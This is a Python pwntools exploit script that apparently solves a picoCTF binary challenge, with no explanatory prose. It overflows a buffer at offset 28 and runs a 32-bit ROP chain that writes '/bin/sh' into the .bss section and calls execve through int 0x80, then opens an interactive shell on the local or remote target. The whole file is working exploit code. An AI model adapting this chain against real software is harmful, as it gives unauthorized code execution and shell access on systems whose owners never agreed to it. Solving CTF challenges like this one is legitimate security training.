#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './vuln'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'
host, port = 'saturn.picoctf.net', 50756

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
io = initialize()
rop = ROP(exe)

# https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit
# execve('/bin/sh', 0, 0)
offset = 28
payload = flat({
    offset: [
        rop.find_gadget(["pop edx", "pop ebx", "ret"])[0],
        b'/bin',
        0,
        rop.find_gadget(["pop eax", "ret"])[0],
        elf.bss(),
        0x0809e5c8, # mov dword ptr [eax], edx; ret;

        rop.find_gadget(["pop edx", "pop ebx", "ret"])[0],
        b'/sh\x00',
        0,
        rop.find_gadget(["pop eax", "ret"])[0],
        elf.bss() + 4,
        0x0809e5c8, # mov dword ptr [eax], edx; ret;

        rop.find_gadget(["pop edx", "pop ebx", "ret"])[0],
        0,
        elf.bss(),
        rop.find_gadget(["pop ecx", "ret"])[0],
        0,
        rop.find_gadget(["pop eax", "ret"])[0],
        0x0b, 
        0x0804a3c2 # int 0x80;
    ]
})


# sending payload
io.sendlineafter(b'!', payload)

io.interactive()